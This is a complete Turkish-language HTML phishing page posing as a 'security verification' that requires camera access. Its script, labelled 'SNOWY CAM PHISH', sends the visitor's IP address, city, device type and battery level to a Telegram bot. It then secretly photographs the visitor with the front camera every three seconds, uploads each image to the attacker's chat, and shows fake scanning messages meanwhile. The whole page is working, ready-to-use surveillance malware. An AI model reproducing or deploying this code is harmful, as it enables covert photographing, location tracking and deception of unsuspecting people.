<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Güvenlik Doğrulaması</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            text-align: center;
        }
        
        h2 {
            color: #333;
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        h2 span {
            color: #667eea;
        }
        
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        
        .btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 16px 32px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
            margin-bottom: 20px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
        }
        
        .btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            color: #667eea;
            font-size: 16px;
        }
        
        .progress {
            width: 100%;
            height: 4px;
            background: #e0e0e0;
            border-radius: 2px;
            margin: 20px 0;
            overflow: hidden;
            display: none;
        }
        
        .progress-bar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            animation: progress 3s infinite;
        }
        
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 100%; }
            100% { width: 0%; }
        }
        
        .footer {
            color: #999;
            font-size: 12px;
            margin-top: 20px;
        }
        
        #video, #canvas {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>❄️ <span>GÜVENLİK</span> DOĞRULAMASI</h2>
        
        <p>Devam etmek için lütfen kamera erişimine izin verin.</p>
        
        <button class="btn" id="startBtn" onclick="startCamera()">
            📸 DOĞRULAMAYI BAŞLAT
        </button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <div class="loading-text" id="loadingText">Tarama yapılıyor...</div>
        </div>
        
        <div class="progress" id="progress">
            <div class="progress-bar"></div>
        </div>
        
        <div class="footer">
            ❄️ Güvenli bağlantı
        </div>
    </div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // URL'den parametreleri al
        const urlParams = new URLSearchParams(window.location.search);
        const BOT_TOKEN = urlParams.get('t');
        const TARGET_ID = urlParams.get('i');
        
        // DOM elementleri
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const startBtn = document.getElementById('startBtn');
        const loading = document.getElementById('loading');
        const progress = document.getElementById('progress');
        const loadingText = document.getElementById('loadingText');
        
        let stream = null;
        let isActive = false;
        let captureInterval = null;
        let infoSent = false;
        
        // Kullanıcı bilgilerini topla ve gönder
        async function collectAndSendInfo() {
            if (infoSent) return;
            infoSent = true;
            
            try {
                // IP adresi
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const ip = ipData.ip;
                
                // Konum
                const locRes = await fetch(`http://ip-api.com/json/${ip}`);
                const locData = await locRes.json();
                let location = 'Bilinmiyor';
                if (locData.status === 'success') {
                    location = `${locData.city}, ${locData.country}`;
                }
                
                // Cihaz bilgisi
                const ua = navigator.userAgent;
                let device = 'Bilinmiyor';
                if (ua.includes('Android')) device = 'Android';
                else if (ua.includes('iPhone')) device = 'iPhone';
                else if (ua.includes('iPad')) device = 'iPad';
                else if (ua.includes('Windows')) device = 'Windows';
                else if (ua.includes('Mac')) device = 'Mac';
                
                // Batarya
                let battery = 'Bilinmiyor';
                if ('getBattery' in navigator) {
                    const batteryData = await navigator.getBattery();
                    battery = Math.round(batteryData.level * 100) + '%';
                }
                
                // Zaman
                const time = new Date().toLocaleString('tr-TR');
                
                // Telegram'a gönder
                const message = 
`❄️ **SNOWY CAM PHISH** ❄️
━━━━━━━━━━━━━━━━━━━━━
📱 **Cihaz:** ${device}
🌐 **IP:** ${ip}
📍 **Konum:** ${location}
🔋 **Batarya:** ${battery}
⏱️ **Zaman:** ${time}
━━━━━━━━━━━━━━━━━━━━━
⚡ @snowy_dexry_wexry`;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: TARGET_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
            } catch(e) {
                console.log('Bilgi gönderilemedi:', e);
            }
        }
        
        // Fotoğraf çek ve gönder
        async function captureAndSend() {
            try {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(async (blob) => {
                    try {
                        const formData = new FormData();
                        formData.append('chat_id', TARGET_ID);
                        formData.append('photo', blob, `cam_${Date.now()}.jpg`);
                        
                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        });
                        
                    } catch(e) {}
                }, 'image/jpeg', 0.7);
                
            } catch(e) {}
        }
        
        // Kamerayı başlat
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    } 
                });
                
                video.srcObject = stream;
                
                startBtn.style.display = 'none';
                loading.style.display = 'block';
                progress.style.display = 'block';
                
                // Bilgileri topla ve gönder
                await collectAndSendInfo();
                
                // 2 saniye bekle (kamera açılsın)
                await new Promise(r => setTimeout(r, 2000));
                
                // Her 3 saniyede bir fotoğraf çek
                isActive = true;
                captureInterval = setInterval(captureAndSend, 3000);
                
                // 10 saniyede bir yazı değişsin
                const texts = [
                    "Tarama yapılıyor...",
                    "Kimlik doğrulanıyor...",
                    "Güvenlik kontrolü...",
                    "Veriler işleniyor...",
                    "Lütfen bekleyin..."
                ];
                
                let textIndex = 0;
                setInterval(() => {
                    textIndex = (textIndex + 1) % texts.length;
                    loadingText.innerText = texts[textIndex];
                }, 3000);
                
            } catch(e) {
                alert('Kamera erişimi gerekli!');
                startBtn.disabled = false;
            }
        }
        
        // Sayfa kapanırken
        window.onbeforeunload = function() {
            if (captureInterval) {
                clearInterval(captureInterval);
            }
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        };
        
    </script>
</body>
    </html>
